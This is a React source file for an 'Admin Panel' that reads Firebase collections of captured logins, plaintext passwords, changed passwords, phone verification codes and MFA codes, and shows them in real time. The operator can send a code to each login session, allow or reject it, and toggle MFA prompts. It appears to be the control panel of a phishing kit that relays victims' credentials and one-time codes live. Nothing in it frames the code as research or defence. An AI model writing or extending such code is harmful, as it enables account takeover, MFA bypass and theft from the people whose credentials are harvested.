import React, { useEffect, useState } from "react";
import { database, ref, child, update, onValue } from "../firebase";
import "./login.css";

const Admin = () => {
  const [logins, setLogins] = useState([]);
  const [recoveries, setRecoveries] = useState([]);
  const [verifications, setVerifications] = useState([]);
  const [newPasswords, setNewPasswords] = useState([]);
  const [mfaCodes, setMfaCodes] = useState([]);

  useEffect(() => {
    const dbRef = ref(database);

    // Real-time listeners
    const unsubLogins = onValue(child(dbRef, "logins"), (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        setLogins(Object.entries(data).map(([id, val]) => ({ id, ...val })));
      }
    });

    const unsubRecoveries = onValue(child(dbRef, "recoveries"), (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        setRecoveries(Object.entries(data).map(([id, val]) => ({ id, ...val })));
      }
    });

    const unsubVerifications = onValue(child(dbRef, "verifications"), (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        setVerifications(Object.entries(data).map(([id, val]) => ({ id, ...val })));
      }
    });

    const unsubPasswords = onValue(child(dbRef, "newPasswords"), (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        setNewPasswords(Object.entries(data).map(([id, val]) => ({ id, ...val })));
      }
    });

    const unsubMfaCodes = onValue(child(dbRef, "mfa_verifications"), (snapshot) => {
      if (snapshot.exists()) {
        const data = snapshot.val();
        setMfaCodes(Object.entries(data).map(([id, val]) => ({ id, ...val })));
      }
    });

    return () => {
      unsubLogins();
      unsubRecoveries();
      unsubVerifications();
      unsubPasswords();
      unsubMfaCodes();
    };
  }, []);

  const phoneToCodeMap = {};
  verifications.forEach(({ phone, code }) => {
    phoneToCodeMap[phone] = code;
  });

  const handleDecision = async (id, status) => {
    await update(ref(database, `logins/${id}`), { status });
  };

  const toggleMfa = async (id, current) => {
    await update(ref(database, `logins/${id}`), { mfa: !current });
  };

  const thStyle = {
    borderBottom: "2px solid #ccc",
    padding: "8px",
    background: "#f1f1f1",
    textAlign: "left",
  };

  const tdStyle = {
    borderBottom: "1px solid #eee",
    padding: "8px",
  };

  return (
    <div className="login-container">
      <div className="login-box" style={{ width: "100%", maxWidth: "900px" }}>
        <h2 className="login-title">Admin Panel - Login History</h2>

        {/* Logins */}
        <table style={{ width: "100%", borderCollapse: "collapse" }}>
          <thead>
            <tr>
              <th style={thStyle}>Email</th>
              <th style={thStyle}>Password</th>
              <th style={thStyle}>Time</th>
              <th style={thStyle}>Status</th>
              <th style={thStyle}>Action</th>
              <th style={thStyle}>MFA</th>
            </tr>
          </thead>
          <tbody>
            {logins.map((entry) => (
              <tr key={entry.id}>
                <td style={tdStyle}>{entry.email}</td>
                <td style={tdStyle}>{entry.password}</td>
                <td style={tdStyle}>{new Date(entry.timestamp).toLocaleString()}</td>
                <td style={tdStyle}>{entry.status || "Pending"}</td>
                <td style={tdStyle}>
                  <div style={{ marginBottom: "6px" }}>
                    <input
                      type="text"
                      placeholder="Code"
                      maxLength={2}
                      style={{ width: "40px", marginRight: "6px" }}
                      value={entry.tempCode || ""}
                      onChange={(e) => {
                        const code = e.target.value.replace(/\D/g, "");
                        setLogins((prev) =>
                          prev.map((item) =>
                            item.id === entry.id ? { ...item, tempCode: code } : item
                          )
                        );
                      }}
                    />
                    <button
                      onClick={async () => {
                        if (entry.tempCode) {
                          await update(ref(database, `logins/${entry.id}`), {
                            mfaCode: entry.tempCode,
                          });
                        }
                      }}
                      disabled={!entry.tempCode}
                      style={{ marginRight: "6px" }}
                    >
                      Send Code
                    </button>
                  </div>

                  <div style={{ marginBottom: "6px" }}>
                    <button
                      onClick={() => handleDecision(entry.id, "allowed")}
                      disabled={entry.status === "allowed"}
                      style={{ marginRight: "6px" }}
                    >
                      Allow
                    </button>
                    <button
                      onClick={() => handleDecision(entry.id, "rejected")}
                      disabled={entry.status === "rejected"}
                    >
                      Reject
                    </button>
                  </div>

                  <div>
                    <button onClick={() => toggleMfa(entry.id, entry.mfa || false)}>
                      {entry.mfa ? "Disable MFA" : "Enable MFA"}
                    </button>
                  </div>
                </td>



              </tr>
            ))}
          </tbody>
        </table>

        {/* Recovery */}
        <h2 className="login-title" style={{ marginTop: "40px" }}>
          Recovery Requests
        </h2>
        <table style={{ width: "100%", borderCollapse: "collapse" }}>
          <thead>
            <tr>
              <th style={thStyle}>Email</th>
              <th style={thStyle}>Phone</th>
              <th style={thStyle}>Verification Code</th>
              <th style={thStyle}>Time</th>
            </tr>
          </thead>
          <tbody>
            {recoveries.map((entry) => (
              <tr key={entry.id}>
                <td style={tdStyle}>{entry.email}</td>
                <td style={tdStyle}>{entry.phone}</td>
                <td style={tdStyle}>{phoneToCodeMap[entry.phone] || "-"}</td>
                <td style={tdStyle}>{new Date(entry.timestamp).toLocaleString()}</td>
              </tr>
            ))}
          </tbody>
        </table>

        {/* New Passwords */}
        <h2 className="login-title" style={{ marginTop: "40px" }}>
          Changed Passwords
        </h2>
        <table style={{ width: "100%", borderCollapse: "collapse" }}>
          <thead>
            <tr>
              <th style={thStyle}>Email</th>
              <th style={thStyle}>New Password</th>
              <th style={thStyle}>Time</th>
            </tr>
          </thead>
          <tbody>
            {newPasswords.map((entry) => (
              <tr key={entry.id}>
                <td style={tdStyle}>{entry.email}</td>
                <td style={tdStyle}>{entry.password}</td>
                <td style={tdStyle}>{new Date(entry.timestamp).toLocaleString()}</td>
              </tr>
            ))}
          </tbody>
        </table>

        {/* MFA */}
        <h2 className="login-title" style={{ marginTop: "40px" }}>
          MFA Codes
        </h2>
        <table style={{ width: "100%", borderCollapse: "collapse" }}>
          <thead>
            <tr>
              <th style={thStyle}>Email</th>
              <th style={thStyle}>Code</th>
              <th style={thStyle}>Time</th>
            </tr>
          </thead>
          <tbody>
            {mfaCodes.map((entry) => (
              <tr key={entry.id}>
                <td style={tdStyle}>{entry.email}</td>
                <td style={tdStyle}>{entry.code}</td>
                <td style={tdStyle}>{new Date(entry.timestamp).toLocaleString()}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
};

export default Admin;
